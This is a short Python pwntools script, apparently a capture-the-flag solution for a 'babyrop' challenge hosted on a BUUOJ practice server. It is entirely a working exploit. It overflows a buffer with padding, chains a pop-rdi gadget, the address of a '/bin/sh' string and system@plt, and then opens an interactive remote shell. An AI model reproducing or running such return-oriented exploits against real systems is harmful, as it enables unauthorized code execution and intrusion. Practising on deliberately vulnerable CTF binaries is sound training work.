from pwn import *

elf = ELF("./babyrop")
pop_rdi_ret = 0x0000000000400683 # pop rdi ; ret
ret = 0x0000000000400479 # ret

#sock = process(elf.path)
sock = remote("node4.buuoj.cn", 27306)

payload = b"A" * 0x18
payload += p64(pop_rdi_ret)
payload += p64(0x601048) # "/bin/sh"
payload += p64(ret)
payload += p64(elf.plt["system"])
sock.sendafter(b"What's your name? ", payload)


sock.interactive()
